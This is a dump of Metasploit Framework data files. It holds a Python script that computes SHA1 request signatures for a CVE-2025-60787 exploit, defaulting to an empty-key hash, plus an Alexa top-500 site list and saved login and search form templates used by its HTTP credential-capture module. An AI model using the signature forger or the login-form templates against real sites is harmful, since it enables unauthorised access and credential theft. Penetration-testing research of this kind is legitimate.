{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/CVE-2025-60787/sign_request.py", "content": "import hashlib\nimport re\nimport argparse\nimport sys\nfrom urllib.parse import urlsplit, parse_qs, unquote, quote\nfrom typing import Dict, List, Tuple\n\n_SIGNATURE_REGEX = re.compile(r'[^A-Za-z0-9/?_.=&{}\\[\\]\":, -]')\n\ndef compute_signature(method: str, path: str, body: str = '', key: str = '') -> str:\n    if not method or not path:\n        raise ValueError(\"Method and path must be provided.\")\n\n    url_parts = urlsplit(path)\n    base_path = url_parts.path\n    \n    if not base_path.startswith('/'):\n        base_path = '/' + base_path\n    \n    raw_query_params: Dict[str, List[str]] = parse_qs(\n        url_parts.query, keep_blank_values=True, strict_parsing=False\n    )\n    \n    canonical_query: List[Tuple[str, str]] = []\n    for k, v_list in raw_query_params.items():\n        if k == '_signature':\n            continue\n            \n        value = unquote(v_list[0]) if v_list else ''\n        canonical_query.append((k, value))\n    \n    canonical_query.sort(key=lambda item: item[0])\n    \n    query_string = '&'.join(f\"{k}={quote(v)}\" for k, v in canonical_query)\n\n    if query_string:\n        canonical_path = f\"{base_path}?{query_string}\"\n    else:\n        canonical_path = base_path\n        \n    canonical_path = re.sub(_SIGNATURE_REGEX, '-', canonical_path)\n\n    body_for_signing = re.sub(_SIGNATURE_REGEX, '-', body)\n    \n    if not key:\n        password_hash = \"da39a3ee5e6b4b0d3255bfef95601890afd80709\"\n    else:\n        password_hash = hashlib.sha1(key.encode('utf-8')).hexdigest().lower()\n\n    data = f\"{method.upper()}:{canonical_path}:{body_for_signing}:{password_hash}\"\n    \n    return hashlib.sha1(data.encode('utf-8')).hexdigest().lower()\n\ndef main():\n    parser = argparse.ArgumentParser(description=\"Computes a SHA1 signature for an HTTP request.\")\n\n    parser.add_argument('--method', type=str, required=True,\n                        choices=['GET', 'POST', 'PUT', 'DELETE'],\n                        help=\"The HTTP method (e.g., GET).\")\n    parser.add_argument('--path', type=str, required=True,\n                        help=\"The canonical path (e.g., /api/resource?param=value).\")\n    parser.add_argument('--key', type=str, default='',\n                        help=\"The secret key. Defaults to an empty string.\")\n    parser.add_argument('--body', type=str, default='',\n                        help=\"The request body as a string. Defaults to an empty string.\")\n\n    try:\n        args = parser.parse_args()\n        \n        signature = compute_signature(\n            method=args.method,\n            path=args.path,\n            body=args.body,\n            key=args.key\n        )\n\n        print(f\"Computed Signature: {signature}\")\n\n    except ValueError as e:\n        sys.stderr.write(f\"Error: {e}\\n\")\n        sys.exit(1)\n    except Exception as e:\n        sys.stderr.write(f\"An unexpected error occurred: {e}\\n\")\n        sys.exit(1)\n\n\nif __name__ == '__main__':\n    main()\n", "timestamp": "2025-10-24T23:39:42.763287"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/alexa.txt", "content": "# Top 500 sites from Alexa (2006-04-21)\nyahoo.com\ngoogle.com\nyoutube.com\nlive.com\nmsn.com\nmyspace.com\nwikipedia.org\nfacebook.com\nblogger.com\nyahoo.co.jp\norkut.com\nrapidshare.com\nbaidu.com\nmicrosoft.com\ngoogle.co.in\ngoogle.de\nqq.com\nebay.com\nhi5.com\ngoogle.fr\naol.com\nmail.ru\ngoogle.co.uk\nsina.com.cn\nfc2.com\nphotobucket.com\ngoogle.com.br\namazon.com\nimdb.com\nvkontakte.ru\ngoogle.it\ngoogle.es\ngoogle.cn\nimageshack.us\nyouporn.com\nwordpress.com\ngoogle.co.jp\nyandex.ru\nflickr.com\nfriendster.com\nskyrock.com\nadultfriendfinder.com\ngo.com\nodnoklassniki.ru\ngoogle.com.mx\nbbc.co.uk\ncraigslist.org\ndailymotion.com\nredtube.com\ncnn.com\n163.com\nmininova.org\ngooglesyndication.com\ntaobao.com\ngoogle.ca\nlivejournal.com\nfotolog.net\nuol.com.br\nimagevenue.com\nebay.de\nnaver.com\nmixi.jp\nrakuten.co.jp\nrambler.ru\nespn.go.com\nfree.fr\nlivedoor.com\nrediff.com\nnicovideo.jp\nadobe.com\nsohu.com\napple.com\n56.com\nyourfilehost.com\nveoh.com\nperfspot.com\ndeviantart.com\nabout.com\ngoogle.com.tr\nyouku.com\nglobo.com\nmegaupload.com\ngoogle.pl\nmetroflog.com\ngoogle.ru\nfastclick.com\nclicksor.com\ngeocities.com\ngoo.ne.jp\ngoogle.co.id\nebay.co.uk\nmediafire.com\nyahoo.com.cn\npartypoker.com\ngamespot.com\ndownload.com\nnytimes.com\ngoogle.com.au\nterra.com.br\nwretch.cc\nweather.com\nthepiratebay.org\nign.com\nbebo.com\ndepositfiles.com\ngoogle.com.sa\nask.com\nnasza-klasa.pl\nadultadworld.com\nnba.com\ngoogle.com.ar\nameblo.jp\nzshare.net\ntudou.com\ndigg.com\ngoogle.nl\namazon.co.jp\n4shared.com\naim.com\nnetlog.com\n2ch.net\ninfoseek.co.jp\nstudiverzeichnis.com\nisohunt.com\ncomcast.net\ndoubleclick.com\nnifty.com\ndaum.net\nsourceforge.net\nusercash.com\ngeocities.jp\nmop.com\nbadongo.com\ncnet.com\nonet.pl\ngoogle.co.th\neasy-share.com\npornhub.com\nmegarotic.com\nimeem.com\ngmx.net\ndell.com\nig.com.br\norange.fr\nxunlei.com\nmetacafe.com\nreference.com\nbiglobe.ne.jp\nsakura.ne.jp\ninformation.com\nhomeway.com.cn\nmultiply.com\n888.com\nlivejasmin.com\nzol.com.cn\nrealitykings.com\ntorrentz.com\nlibero.it\nnarod.ru\nweb.de\ngoogle.co.za\nsoso.com\nmozilla.com\namazon.de\nfilefactory.com\nebay.it\ngoogle.com.eg\nicq.com\nbrazzers.com\ngoogle.co.ve\nallegro.pl\nucoz.ru\nanonym.to\ntinypic.com\nalice.it\nblogfa.com\nvnexpress.net\nwp.pl\nwikimedia.org\nhp.com\nmaktoob.com\nmapquest.com\ngoogle.com.co\ntypepad.com\ninvisionfree.com\npaypopup.com\nmercadolibre.com.mx\nschuelervz.net\nsendspace.com\ngoogle.com.pk\nebay.fr\nspiegel.de\nhatena.ne.jp\ngoogle.be\nseznam.cz\nlinkedin.com\nanswers.com\nmercadolivre.com.br\nxtube.com\ndtiblog.com\ndada.net\nminiclip.com\nxvideos.com\nmegaclick.com\nsoftonic.com\nbangbros1.com\nadsrevenue.net\ncricinfo.com\nzedo.com\nfreewebs.com\nhyves.nl\nalibaba.com\nxnxx.com\nworldofwarcraft.com\nbankofamerica.com\nfiles.wordpress.com\nbadoo.com\nhao123.com\nfilefront.com\ngoogle.com.pe\ngoogle.cl\ngoogle.com.vn\ngamefaqs.com\nseesaa.net\ngougou.com\nchina.com\nxanga.com\nkooora.com\ntom.com\ngoogle.gr\naltervista.org\namazon.co.uk\nzaycev.net\nocn.ne.jp\ntaringa.net\ncyworld.com\nindiatimes.com\nziddu.com\nsoufun.com\nrapidshare.de\ngoogle.at\nslide.com\nbestbuy.com\ntripod.com\nliveinternet.ru\njugem.jp\nflurl.com\nfanfiction.net\nthottbot.com\ngoogle.se\nwwe.com\nsoftpedia.com\npcpop.com\nbreak.com\ngoogle.ch\nchase.com\naebn.net\nreuters.com\nsmileycentral.com\nmegavideo.com\nmarca.com\nfling.com\neastmoney.com\ndebonairblog.com\naltavista.com\nxboard.us\nfreeones.com\nmyfreepaysite.com\nnetflix.com\ngoogle.ro\ntechnorati.com\npchome.net\ngametrailers.com\nlivescore.com\npayserve.com\nsonico.com\nsymantec.com\ntagged.com\nwebshots.com\nfotka.pl\ngoogle.com.my\nlast.fm\npornotube.com\nifolder.ru\ntianya.cn\nmozilla.org\narchive.org\ngoogle.pt\ngaiaonline.com\nkaskus.us\ntarget.com\nyaplog.jp\n21cn.com\nwalmart.com\ntv.com\nfoxsports.com\ndantri.com.vn\nsogou.com\ndisney.go.com\nultimate-guitar.com\nbrazzersnetwork.com\nuwants.com\nku6.com\ndmm.co.jp\ninteria.pl\n126.com\nplaystation.com\nnewgrounds.com\nneopets.com\nbangbros.com\nrunescape.com\nxinhuanet.com\nvideosz.com\nexblog.jp\nfoxnews.com\nmywebsearch.com\nistockphoto.com\nelmundo.es\ncocolog-nifty.com\nnih.gov\nnewegg.com\nskype.com\nnaukri.com\nzango.com\nmatch.com\nshopping.com\nsexyono.com\ntu.tv\nverycd.com\nimagefap.com\nblogchina.com\nusps.com\natt.com\nyimg.com\nwow-europe.com\nmtv.com\nwashingtonpost.com\natt.net\nstumbleupon.com\ncmfu.com\ngoogle.co.hu\nmilliyet.com.tr\nesnips.com\nforbes.com\nlivedoor.biz\nvagos.es\nwikia.com\nengadget.com\nleo.org\nhurriyet.com.tr\nporndirt.com\nreal.com\ngoogle.com.ph\nmonster.com\ncareerbuilder.com\nover-blog.com\nit168.com\nletitbit.net\nduowan.com\nconduit.com\nmobile9.com\nmediaplex.com\nclicksor.net\nexcite.co.jp\nlinternaute.com\nhornymatches.com\nwowhead.com\ngooglepages.com\nstartimes2.com\nebay.com.au\n1und1.de\nmyvideo.de\nrmxads.com\nwamu.com\nups.com\nmeebo.com\njeuxvideo.com\nno-ip.com\npetardas.com\niwiw.hu\nrepubblica.it\ndion.ne.jp\nadult-empire.com\ndiscuss.com.hk\nmsn.ca\nvmn.net\nso-net.ne.jp\nstarware.com\nxbox.com\nwatch-movies.net\nt-online.de\ntorrentreactor.net\nutorrent.com\npornaccess.com\n89.com\nfreelotto.com\nunivision.com\nguardian.co.uk\nbtjunkie.org\nrr.com\ngoogle.ae\nverizon.net\nteacup.com\nmercadolibre.com.ar\nexpedia.com\nforumfree.net\ncorriere.it\n6park.com\nameba.jp\npeople.com.cn\nmlb.com\nshinobi.jp\nminijuegos.com\nezinearticles.com\nmsplinks.com\nxiaonei.com\npogo.com\niij4u.or.jp\nforumcommunity.net\n01net.com\nibm.com\ndyndns.org\nmynet.com\nyam.com\ngoogle.com.ua\nsquidoo.com\nmobile.de\ngoogle.dk\n4chan.org\nflixster.com\ngodaddy.com\nwordreference.com\nrude.com\n110mb.com\nbramjnet.com\npeople.com\nsparkstudios.net\nnokia.com\nsapo.pt\nzedge.net\nwowarmory.com\nchinaren.com\nwarez-bb.org\ncircuitcity.com\ntorrentz.ws\nsify.com\nthefreedictionary.com\nnnm.ru\naweber.com\ngoogle.fi\nmoneycontrol.com\nbild.de\ncommentcamarche.net\naddictinggames.com\nperezhilton.com\nplala.or.jp\nbharatstudent.com\ntradedoubler.com\nifeng.com\nikea.com\nkakaku.com\ntorrents.ru\ncrunchyroll.com\ncartoonnetwork.com\ngoogle.com.tw\npchome.com.tw\nallocine.fr\nxhamster.com\nwsj.com\nvietnamnet.vn\nhattrick.org\nonemanga.com\nabcnews.go.com\nmyway.com\njuggcrew.com\nspankwire.com\nsweetim.com\ndealtime.com\nmusica.com\natwiki.jp\nmarketgid.com\nstage6.com\ngyao.jp\nfc2web.com\nleonardo.it\nwhenu.com\nzylom.com\nbuzznet.com\ngoogle.com.sg\nadbrite.com\nslickdeals.net\nebay.es\nmforos.com\ntruveo.com\nbangbrosnetwork.com\nwannawatch.com\ngoogle.ie\n\n", "timestamp": "2025-10-24T23:39:43.096103"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/01net.com.txt", "content": "<form action='http://www.01net.com/recherche/01net.php' method='get'> <input name=\"searchstring\" size=\"50\" type=\"text\" value=\"\" style=\"font-size:9px;\" /><input type=\"image\" src=\"/img/v4/ok_bloc_recherV2.gif\" border=\"0\" align=\"absmiddle\" /><input name=\"type\" checked type=\"radio\" value=\"\" /><input name=\"type\" type=\"radio\" value=\"\" /></form><form name='FINDJOB' action='http://emploi.01net.com/recherche_emploi.php' method='post'> <input name=\"xmlStepIndex\" type=\"hidden\" id=\"xmlStepIndex\" value=\"\" /><input name=\"xmlSeqIndex\" type=\"hidden\" id=\"xmlSeqIndex\" value=\"\" /><input name=\"xmlActionAsked\" type=\"hidden\" id=\"xmlActionAsked\" value=\"\" /><input name=\"xmlActionParam\" type=\"hidden\" id=\"xmlActionParam\" value=\"\" /><input name=\"xmlFormName\" type=\"hidden\" id=\"xmlFormName\" value=\"\" /><input name=\"FTWords\" size=\"30\" type=\"text\" value=\"\" style=\"width:125px;\" /><input name=\"FTType\" checked type=\"radio\" value=\"\" /><input name=\"FTType\" type=\"radio\" value=\"\" /><input name=\"FTType\" type=\"radio\" value=\"\" /><input name=\"valider\" type=\"image\" src=\"\" alt=\"\" onclick=\"\" /></form><form name='TOPJOBRESULT' method='post'> <input name=\"xmlActionAsked\" type=\"hidden\" id=\"xmlActionAsked\" value=\"\" /><input name=\"xmlActionParam\" type=\"hidden\" id=\"xmlActionParam\" value=\"\" /><input name=\"xmlActionParamStatus\" type=\"hidden\" id=\"xmlActionParamStatus\" value=\"\" /><input name=\"xmlFormName\" type=\"hidden\" id=\"xmlFormName\" value=\"\" /><input name=\"xmlURLNew\" type=\"hidden\" id=\"xmlURLNew\" value=\"\" /><input name=\"xmlURLView\" type=\"hidden\" id=\"xmlURLView\" value=\"\" /><input name=\"xmlURLUpdate\" type=\"hidden\" id=\"xmlURLUpdate\" value=\"\" /><input name=\"xmlURLDelete\" type=\"hidden\" id=\"xmlURLDelete\" value=\"\" /><input name=\"xmlUpdKey_1\" type=\"hidden\" id=\"xmlUpdKey_1\" value=\"\" /><input name=\"xmlUpdKey_2\" type=\"hidden\" id=\"xmlUpdKey_2\" value=\"\" /><input name=\"xmlUpdKey_3\" type=\"hidden\" id=\"xmlUpdKey_3\" value=\"\" /><input name=\"xmlUpdKey_4\" type=\"hidden\" id=\"xmlUpdKey_4\" value=\"\" /><input name=\"xmlUpdKey_5\" type=\"hidden\" id=\"xmlUpdKey_5\" value=\"\" /><input name=\"xmlListCount\" type=\"hidden\" id=\"xmlListCount\" value=\"\" /><input name=\"xmlListOrderby\" type=\"hidden\" id=\"xmlListOrderby\" value=\"\" /><input name=\"xmlListPos\" type=\"hidden\" id=\"xmlListPos\" value=\"\" /></form><form name='formgen2' action='http://www3.01net.com/web01net/form/Conn/Valid.asp' method='post' onsubmit='return validateForm(this)'> </form><form name='rechprix' action='/shopping/js/mha.php' method='post' target='_blank'> <input name=\"u\" type=\"hidden\" value=\"\" /><input name=\"recherchedirecte\" size=\"15\" value=\"\" onfocus=\"this.value = ''\" style=\"font-size:8pt;font-family:Arial;\" /><input type=\"image\" src=\"/img/shopping/bouton.gif\" alt=\"Recherche\" style=\"border:0;margin-left:5px;\" /></form>", "timestamp": "2025-10-24T23:39:43.426866"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/126.com.txt", "content": "<form name='form' action='http://entry.126.com/cgi/login' method='post' onsubmit='return fCheck()'> <input name=\"domain\" type=\"hidden\" value=\"\" /><input name=\"language\" type=\"hidden\" value=\"\" /><input name=\"bCookie\" type=\"hidden\" value=\"\" /><input name=\"user\" tabindex=\"1\" type=\"text\" onmouseover=\"fEvent('mouseover',this)\" onfocus=\"fEvent('focus',this)\" onmouseout=\"fEvent('mouseout',this)\" maxlength=\"20\" onblur=\"fEvent('blur',this)\" /><input name=\"pass\" tabindex=\"2\" size=\"16\" onmouseover=\"fEvent('mouseover',this)\" type=\"password\" onfocus=\"fEvent('focus',this)\" onmouseout=\"fEvent('mouseout',this)\" maxlength=\"20\" onblur=\"fEvent('blur',this)\" /><input name=\"remUser\" checked=\"checked\" type=\"checkbox\" id=\"rem_U\" value=\"\" /><input name=\"secure\" checked=\"checked\" type=\"checkbox\" id=\"secure\" value=\"\" /><input name=\"enter.x\" tabindex=\"4\" class=\"inp_L1\" type=\"submit\" onmouseover=\"this.className='inp_L2'\" id=\"input_btn1\" value=\"\" onmouseout=\"this.className='inp_L1'\" onclick=\"setCookie('ntes_mail_firstpage','normal');saveLoginType();\" /><input tabindex=\"4\" class=\"inp_L1\" type=\"submit\" onmouseover=\"this.className='inp_L2'\" id=\"input_btn2\" value=\"\" onmouseout=\"this.className='inp_L1'\" onclick=\"setCookie('ntes_mail_firstpage','normal');saveLoginType();\" style=\"display:none\" /></form>", "timestamp": "2025-10-24T23:39:43.750506"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/163.com.txt", "content": "<form name='nisearch1' action='http://www.yodao.com/search' method='get' id='yodaoForm' target='_blank'> <input name=\"keyfrom\" type=\"hidden\" value=\"\" /><input name=\"suser\" type=\"hidden\" value=\"\" /><input name=\"ue\" type=\"hidden\" value=\"\" /><input name=\"q\" class=\"inputTextSearch\" type=\"text\" id=\"searchInput0\" value=\"\" onfocus=\"this.value=''\" /></form><form name='nisearch2' action='http://news.yodao.com/search' method='get' id='soNews' onsubmit='return sonews_checksubmit();' target='_blank'> <input name=\"keyfrom\" type=\"hidden\" value=\"\" /><input name=\"site\" type=\"hidden\" id=\"site\" value=\"\" /><input name=\"suser\" type=\"hidden\" value=\"\" /><input name=\"ue\" type=\"hidden\" value=\"\" /><input name=\"q\" class=\"inputText\" type=\"text\" id=\"soInput\" value=\"\" onfocus=\"this.value=''\" /><input class=\"button\" type=\"submit\" value=\"\" /></form><form name='frmVote' action='http://vote.talk.163.com/vote/voting.jsp' method='post' target='votewin'> <input name=\"voteid\" type=\"hidden\" value=\"\" /><input name=\"markinfo\" type=\"hidden\" value=\"\" /><input name=\"checktype\" type=\"hidden\" value=\"\" /><input name=\"op\" type=\"radio\" value=\"\" /><input name=\"op\" type=\"radio\" value=\"\" /><input name=\"op\" type=\"radio\" value=\"\" /><input name=\"vSubmit\" type=\"submit\" value=\"\" /></form><form name='frmguess916' action='http://vote.sports.163.com/guess/guess.jsp' method='post' target='guesswin'> <input name=\"next\" type=\"hidden\" value=\"\" /><input name=\"stepnum\" type=\"hidden\" value=\"\" /><input name=\"gid\" type=\"hidden\" value=\"\" /><input name=\"qid\" type=\"hidden\" value=\"\" /><input name=\"chk_question\" type=\"radio\" value=\"\" onclick=\"frmguess916.submit();\" /><input name=\"chk_question\" type=\"radio\" value=\"\" onclick=\"frmguess916.submit();\" /><input name=\"chk_question\" type=\"radio\" value=\"\" onclick=\"frmguess916.submit();\" /><input name=\"chk_question\" type=\"radio\" value=\"\" onclick=\"frmguess916.submit();\" /></form><form name='frmVote28297' action='http://vote.sports.163.com/vote/voting.jsp' method='post' target='votewin'> <input name=\"voteid\" type=\"hidden\" value=\"\" /><input name=\"markinfo\" type=\"hidden\" value=\"\" /><input name=\"checktype\" type=\"hidden\" value=\"\" /><input name=\"op\" type=\"radio\" value=\"\" /><input name=\"op\" type=\"radio\" value=\"\" /><input name=\"op\" type=\"radio\" value=\"\" /><input name=\"op\" type=\"radio\" value=\"\" /></form><form name='search_stock' action='http://quotes.money.163.com/query_bbs.jsp' method='post' id='search_stock' target='_blank'> <input name=\"url\" type=\"hidden\" id=\"url\" value=\"\" /><input name=\"code\" class=\"inputText\" type=\"text\" id=\"code\" value=\"\" onfocus=\"if(this.value=='\u00b4\u00fa\u00c2\u00eb/\u00c6\u00b4\u00d2\u00f4/\u00c3\u00fb\u00b3\u00c6') {this.value=''}\" onblur=\"if(this.value==''){this.value='\u00b4\u00fa\u00c2\u00eb/\u00c6\u00b4\u00d2\u00f4/\u00c3\u00fb\u00b3\u00c6'}\" /><input name=\"guba\" class=\"button\" type=\"submit\" id=\"guba\" value=\"\" /></form><form name='gpform1' action='http://quotes.money.163.com/query_result.jsp' onsubmit='return gpsoso(a);' method='post' target='_blank'> <input name=\"code\" class=\"inputText\" type=\"text\" onmouseover=\"if(this.value==\"\u00b4\u00fa\u00c2\u00eb/\u00c6\u00b4\u00d2\u00f4/\u00ba\u00ba\u00d7\u00d6\")this.select();\" id=\"a\" value=\"\" onfocus=\"if(this.value=='\u00b4\u00fa\u00c2\u00eb/\u00c6\u00b4\u00d2\u00f4/\u00ba\u00ba\u00d7\u00d6') {this.value='';}\" /><input name=\"gpsub\" class=\"button\" type=\"submit\" id=\"gpsub\" value=\"\" /></form><form name='frmxiangqin' action='http://bbs.lady.163.com/bbs/list.jsp' method='post'> <input name=\"boardid\" type=\"hidden\" value=\"\" /><input name=\"plugin\" type=\"hidden\" value=\"\" /><input name=\"type\" type=\"hidden\" value=\"\" /><input name=\"xxsubmit\" class=\"button\" type=\"submit\" id=\" \" value=\"\" /></form>", "timestamp": "2025-10-24T23:39:44.085755"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/1und1.de.txt", "content": "<form name='searchform' action='/index.php?MSID=ac1704c4PXE8mt1VQ9J1Zp4Bekno35tl&page=search' method='post'> <input name=\"query\" size=\"7\" class=\"srch\" type=\"text\" /><input name=\"go\" title=\"Los!\" type=\"image\" src=\"img/btn/los.gif\" alt=\"Los!\" style=\"width: 43px; height:19px; border: 0px\" /><input name=\"search\" type=\"hidden\" value=\"\" /></form>", "timestamp": "2025-10-24T23:39:44.420884"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/2ch.net.txt", "content": "<form name='f' action='http://find.2ch.net/' method='GET'> <input name=\"STR\" size=\"22\" value=\"\" /><input type=\"submit\" value=\"\" style=\"font-size:90%;padding:1px;\" /><input name=\"BBS\" type=\"hidden\" value=\"\" /><input name=\"ENCODING\" type=\"hidden\" value=\"\" /><input name=\"COUNT\" type=\"hidden\" value=\"\" /></form>", "timestamp": "2025-10-24T23:39:44.765096"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/4shared.com.txt", "content": "<form action='https://www.4shared.com/index.jsp' method='post'> <input name=\"login\" class=\"fieldhint\" type=\"text\" id=\"loginfield\" value=\"\" onfocus=\"clearLogin();\" style=\"width:75px\" onblur=\"showLogin();\" /><input name=\"password\" class=\"fieldhint\" type=\"password\" id=\"passfield\" value=\"\" onfocus=\"clearPassword();\" style=\"width:75px\" onblur=\"showPassword();\" /><input class=\"button\" type=\"submit\" value=\"\" style=\"width:43px\" /><input name=\"remember\" type=\"checkbox\" id=\"remember\" value=\"\" /></form><form name='searchform' action='/network/search.jsp' method='GET'> <input name=\"searchmode\" type=\"hidden\" value=\"\" /><input name=\"searchName\" class=\"field\" type=\"text\" id=\"searchfield\" value=\"\" style=\"width:135px\" /><input class=\"button\" type=\"submit\" value=\"\" style=\"width:60px\" /></form>", "timestamp": "2025-10-24T23:39:45.104938"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/56.com.txt", "content": "<form name='search' action='http://so.56.com/index' method='GET' target='_blank'> <input name=\"key\" size=\"40\" autocomplete=\"off\" class=\"searchOut\" type=\"text\" id=\"Search_input\" onkeyup=\"jLoad.eHandle(event)\" value=\"\" maxlength=\"60\" onblur=\"jLoad.jBlur()\" /><input class=\"SearchOut\" type=\"submit\" onmouseover=\"this.className='SearchOvr'\" id=\"Search_btn\" value=\"\" onmouseout=\"this.className='SearchOut'\" /></form><form name='search2' action='http://so.56.com/index' method='GET' target='_blank'> <input name=\"key\" size=\"60\" class=\"searchOut\" type=\"text\" id=\"Search_input2\" accesskey=\"q\" value=\"\" maxlength=\"60\" /><input class=\"SearchOut\" type=\"submit\" onmouseover=\"this.className='SearchOvr'\" id=\"Search_btn2\" value=\"\" onmouseout=\"this.className='SearchOut'\" /></form>", "timestamp": "2025-10-24T23:39:45.428738"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/6park.com.txt", "content": "<form action='http://www.6park.com/parks/search.php' method='get'> <input name=\"word\" type=\"text\" style=\"width:95px;height:21;font-size:12px;padding-top:4px;padding-left:4px\" /><input name=\"url\" type=\"radio\" value=\"\" /><input name=\"url\" checked type=\"radio\" value=\"\" /><input name=\"submit\" type=\"submit\" value=\"\" style=\"BORDER-RIGHT: 0px; BORDER-TOP: 0px; BACKGROUND-IMAGE: url(bgb.gif); BORDER-LEFT: 0px; WIDTH: 38px; BORDER-BOTTOM: 0px; HEIGHT: 23px\" /></form>", "timestamp": "2025-10-24T23:39:45.752233"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/89.com.txt", "content": "<form action='r/'> <input name=\"g\" type=\"hidden\" value=\"\" /><input type=\"submit\" value=\"\" /></form><form action='r/'> <input name=\"g\" type=\"hidden\" value=\"\" /><input type=\"submit\" value=\"\" /></form><form action='b/anime/sites/'> <input type=\"submit\" value=\"\" /></form><form action='r/'> <input name=\"g\" type=\"hidden\" value=\"\" /><input type=\"submit\" value=\"\" /></form><form action='r/'> <input name=\"g\" type=\"hidden\" value=\"\" /><input type=\"submit\" value=\"\" /></form><form action='r/'> <input name=\"g\" type=\"hidden\" value=\"\" /><input type=\"submit\" value=\"\" /></form><form action='r/'> <input name=\"g\" type=\"hidden\" value=\"\" /><input type=\"submit\" value=\"\" /></form><form action='r/'> <input name=\"g\" type=\"hidden\" value=\"\" /><input type=\"submit\" value=\"\" /></form><form action='r/'> <input name=\"g\" type=\"hidden\" value=\"\" /><input type=\"submit\" value=\"\" /></form><form action='r/'> <input name=\"g\" type=\"hidden\" value=\"\" /><input type=\"submit\" value=\"\" /></form><form action='r/'> <input name=\"g\" type=\"hidden\" value=\"\" /><input type=\"submit\" value=\"\" /></form><form action='r/'> <input name=\"g\" type=\"hidden\" value=\"\" /><input type=\"submit\" value=\"\" /></form><form action='movies/'> <input class=\"BB\" type=\"submit\" value=\"\" /></form><form action='r/'> <input name=\"g\" type=\"hidden\" value=\"\" /><input type=\"submit\" value=\"\" /></form><form action='r/'> <input name=\"g\" type=\"hidden\" value=\"\" /><input type=\"submit\" value=\"\" /></form><form action='r/'> <input name=\"g\" type=\"hidden\" value=\"\" /><input type=\"submit\" value=\"\" /></form><form action='r/'> <input name=\"g\" type=\"hidden\" value=\"\" /><input type=\"submit\" value=\"\" /></form><form action='r/'> <input name=\"g\" type=\"hidden\" value=\"\" /><input type=\"submit\" value=\"\" /></form><form action='r/'> <input name=\"g\" type=\"hidden\" value=\"\" /><input type=\"submit\" value=\"\" /></form><form action='r/'> <input name=\"g\" type=\"hidden\" value=\"\" /><input type=\"submit\" value=\"\" /></form><form action='r/'> <input name=\"g\" type=\"hidden\" value=\"\" /><input type=\"submit\" value=\"\" /></form><form action='r/'> <input name=\"g\" type=\"hidden\" value=\"\" /><input type=\"submit\" value=\"\" /></form><form action='r/'> <input name=\"g\" type=\"hidden\" value=\"\" /><input type=\"submit\" value=\"\" /></form><form action='r/'> <input name=\"g\" type=\"hidden\" value=\"\" /><input type=\"submit\" value=\"\" /></form><form action='r/'> <input name=\"g\" type=\"hidden\" value=\"\" /><input type=\"submit\" value=\"\" /></form><form action='av/' target='_blank'> <input title=\"play selected video clip\" type=\"SUBMIT\" value=\"\" /></form><form action='av/' target='_blank'> <input title=\"play selected video clip\" type=\"SUBMIT\" value=\"\" /></form><form action='m/'> <input type=\"SUBMIT\" value=\"\" /></form><form action='search/'> <input type=\"SUBMIT\" value=\"\" /></form><form action='search/'> <input type=\"SUBMIT\" value=\"\" /></form><form action='vg/'> <input name=\"p\" type=\"hidden\" value=\"\" /><input type=\"SUBMIT\" value=\"\" /></form><form action='vg/'> <input name=\"p\" type=\"hidden\" value=\"\" /><input type=\"SUBMIT\" value=\"\" /></form><form action='c/' target='_blank'> <input type=\"SUBMIT\" value=\"\" /></form><form action='us/' target='_blank'> <input type=\"SUBMIT\" value=\"\" /></form><form action='y/' target='_blank'> <input type=\"SUBMIT\" value=\"\" /></form><form action='w/' target='_blank'> <input type=\"SUBMIT\" value=\"\" /></form><form action='k/'> <input type=\"SUBMIT\" value=\"\" /></form><form action='o/' target='_blank'> <input type=\"SUBMIT\" value=\"\" /></form>", "timestamp": "2025-10-24T23:39:46.069690"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/abcnews.go.com.txt", "content": "<form action='/search' id='searchForm' onsubmit='return tgSearch(this);'> <input name=\"searchtext\" type=\"text\" id=\"searchtext\" value=\"\" maxlength=\"200\" /><input name=\"go\" class=\"go\" type=\"image\" src=\"\" alt=\"Go\" /></form><form action='http://abcnews.go.com/Business/page' id='idms_getquoteform' method='get'> <input name=\"id\" type=\"hidden\" value=\"\" /><input name=\"tid\" class=\"qsearch\" type=\"text\" id=\"idms_ticker_getquotebox\" value=\"\" onfocus=\"if(this.value=='Get Quote')this.value='';\" onblur=\"if(this.value=='') this.value='Get Quote'\" /><input class=\"getquotebut\" type=\"image\" src=\"\" border=\"0\" height=\"22\" onclick=\"this.submit();\" alt=\"Go\" width=\"74\" /></form>", "timestamp": "2025-10-24T23:39:46.398971"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/about.com.txt", "content": "<form name='sas' class='gsearch' action='http://clk.about.com/' method='get' target='_top' alert='Please enter something to search for!'> <input name=\"terms\" class=\"txt\" type=\"text\" validate=\"required\" id=\"sTxt\" value=\"\" /><input name=\"zi\" type=\"hidden\" value=\"\" /><input name=\"tt\" type=\"hidden\" value=\"\" /><input name=\"bts\" type=\"hidden\" value=\"\" /></form><form name='subscription' action='http://apps.about.com/cgi-bin/apps/nl/nl.pl' method='get' onsubmit='return zVE(subscription.email)'> <input name=\"surl\" type=\"hidden\" value=\"\" /><input name=\"zi\" type=\"hidden\" value=\"\" /><input name=\"eurl\" type=\"hidden\" value=\"\" /><input name=\"site\" type=\"hidden\" value=\"\" /><input name=\"debug\" type=\"hidden\" value=\"\" /><input name=\"cmd_todaysl\" type=\"hidden\" value=\"\" /><input name=\"email\" type=\"text\" id=\"nTxt\" value=\"\" onfocus=\"zOF(this)\" /></form>", "timestamp": "2025-10-24T23:39:46.719121"}
